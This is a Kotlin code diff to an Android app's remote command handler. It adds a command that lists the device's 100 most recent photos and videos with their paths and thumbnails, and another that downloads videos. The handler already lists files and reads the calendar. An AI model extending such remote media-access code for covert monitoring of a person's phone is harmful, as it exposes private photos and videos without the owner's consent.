@@ -103,7 +103,9 @@ class CommandExecutor(private val context: Context) {
             "PLAY_ALARM" -> playAlarm(commandId, deviceId, payload, onSuccess, onError)
             "VIBRATE_DEVICE" -> vibrateDevice(commandId, deviceId, payload, onSuccess, onError)
             "LIST_FILES" -> listFiles(commandId, deviceId, payload, onSuccess, onError)
+            "LIST_MEDIA" -> listMedia(commandId, deviceId, onSuccess, onError)
             "DOWNLOAD_FILE" -> downloadFile(commandId, deviceId, payload, onSuccess, onError)
+            "DOWNLOAD_VIDEO" -> downloadFile(commandId, deviceId, payload, onSuccess, onError)
             "GET_CALENDAR" -> getCalendar(commandId, deviceId, onSuccess, onError)
             "GET_BATTERY" -> getBattery(commandId, deviceId, onSuccess, onError)
             else -> onError("Unknown command: $commandType")
@@ -385,6 +387,102 @@ class CommandExecutor(private val context: Context) {
             onSuccess(result.toString())
         } catch (e: Exception) {
             onError(e.message ?: "List files failed")
+        }
+    }
+
+    private fun listMedia(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val resolver: ContentResolver = context.contentResolver
+            val results = JSONArray()
+
+            // query images
+            val imageUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                android.provider.MediaStore.Images.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
+            } else {
+                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            }
+            val imgProjection = arrayOf(
+                android.provider.MediaStore.Images.Media._ID,
+                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
+                android.provider.MediaStore.Images.Media.DATA,
+                android.provider.MediaStore.Images.Media.SIZE,
+                android.provider.MediaStore.Images.Media.DATE_ADDED
+            )
+            resolver.query(imageUri, imgProjection, null, null, "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 100")?.use { cursor ->
+                val idCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media._ID)
+                val nameCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
+                val dataCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATA)
+                val sizeCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.SIZE)
+                while (cursor.moveToNext()) {
+                    val id = if (idCol >= 0) cursor.getLong(idCol) else 0L
+                    val path = if (dataCol >= 0) cursor.getString(dataCol) else ""
+                    if (path.isNullOrBlank()) continue
+                    val name = if (nameCol >= 0) cursor.getString(nameCol) else "image"
+                    val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else 0L
+                    val thumbUri = android.provider.MediaStore.Images.Thumbnails.getContentUri("external")
+                    val thumbPath = android.provider.MediaStore.Images.Thumbnails.queryMiniThumbnail(
+                        resolver, id,
+                        android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null
+                    )?.use { t ->
+                        val tCol = t.getColumnIndex(android.provider.MediaStore.Images.Thumbnails.DATA)
+                        if (tCol >= 0) t.getString(tCol) else ""
+                    } ?: ""
+
+                    results.put(JSONObject().apply {
+                        put("name", name)
+                        put("path", path)
+                        put("size", size)
+                        put("mime", "image/${name.substringAfterLast('.', "jpeg")}")
+                        put("thumb_url", thumbPath)
+                    })
+                }
+            }
+
+            // query videos
+            val videoUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                android.provider.MediaStore.Video.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
+            } else {
+                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+            }
+            val vidProjection = arrayOf(
+                android.provider.MediaStore.Video.Media._ID,
+                android.provider.MediaStore.Video.Media.DISPLAY_NAME,
+                android.provider.MediaStore.Video.Media.DATA,
+                android.provider.MediaStore.Video.Media.SIZE,
+                android.provider.MediaStore.Video.Media.DATE_ADDED
+            )
+            resolver.query(videoUri, vidProjection, null, null, "${android.provider.MediaStore.Video.Media.DATE_ADDED} DESC LIMIT 100")?.use { cursor ->
+                val idCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media._ID)
+                val nameCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media.DISPLAY_NAME)
+                val dataCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media.DATA)
+                val sizeCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media.SIZE)
+                while (cursor.moveToNext()) {
+                    val id = if (idCol >= 0) cursor.getLong(idCol) else 0L
+                    val path = if (dataCol >= 0) cursor.getString(dataCol) else ""
+                    if (path.isNullOrBlank()) continue
+                    val name = if (nameCol >= 0) cursor.getString(nameCol) else "video"
+                    val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else 0L
+                    val thumbPath = android.provider.MediaStore.Video.Thumbnails.queryMiniThumbnail(
+                        resolver, id,
+                        android.provider.MediaStore.Video.Thumbnails.MINI_KIND, null
+                    )?.use { t ->
+                        val tCol = t.getColumnIndex(android.provider.MediaStore.Video.Thumbnails.DATA)
+                        if (tCol >= 0) t.getString(tCol) else ""
+                    } ?: ""
+
+                    results.put(JSONObject().apply {
+                        put("name", name)
+                        put("path", path)
+                        put("size", size)
+                        put("mime", "video/${name.substringAfterLast('.', "mp4")}")
+                        put("thumb_url", thumbPath)
+                    })
+                }
+            }
+
+            onSuccess(results.toString())
+        } catch (e: Exception) {
+            onError(e.message ?: "List media failed")
         }
     }
 
